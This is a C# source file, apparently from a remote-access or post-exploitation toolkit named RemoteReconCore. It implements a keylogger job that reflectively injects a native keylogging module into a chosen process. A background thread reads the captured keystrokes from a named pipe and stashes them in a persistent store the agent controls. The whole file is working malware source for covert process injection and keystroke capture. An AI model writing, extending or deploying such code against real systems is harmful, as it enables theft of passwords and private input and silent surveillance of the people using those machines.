using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.IO;
using System.Text;
using System.Threading;
using ReflectiveInjector;

namespace RemoteReconCore
{
    public class Keylogger : IJobs
    {
        private int targetPid;

        public Keylogger(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string> Run()
        {
            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog");
            Injector keylog = new Injector(targetPid, keylogMod);
            if (!keylog.Inject())
                return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
            else
            {
#if DEBUG 
                Console.WriteLine("Injected Keylogger");
#endif
                Thread t = new Thread(() =>
                {
                    WriteKeyStrokes();
                });
                t.SetApartmentState(ApartmentState.STA);
                t.IsBackground = true;
                t.Start();
#if DEBUG
                Console.WriteLine("Started background thread to sync keylogger");
#endif
                return new KeyValuePair<int, string>(0, "Keylogger successfully started");
            }
            
        }

        private static void WriteKeyStrokes()
        {
            Thread.Sleep(Agent.sleep * 1000);

            NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.InOut);
            client.Connect(Agent.sleep * 1000);
#if DEBUG
            Console.WriteLine("Connected to namedpipe server");
            Console.WriteLine("Starting loop");
#endif
            while(client.IsConnected)
            {
                
                string oldVal = Encoding.Unicode.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                byte[] msg = new byte[1024];
                client.ReadMode = PipeTransmissionMode.Byte;
                client.Read(msg, 0, msg.Length);
                string newVal = Encoding.Unicode.GetString(msg);
                oldVal = oldVal + newVal;
#if DEBUG 
                Console.Write(oldVal);
#endif
                Agent.rrbase.SetValue(Agent.kkey, oldVal);

                client.Connect(Agent.sleep * 1000);
            }

#if DEBUG
            Console.WriteLine("Client disconnected");
#endif
            client.Close();
            client.Dispose();
            
        }
    }
}
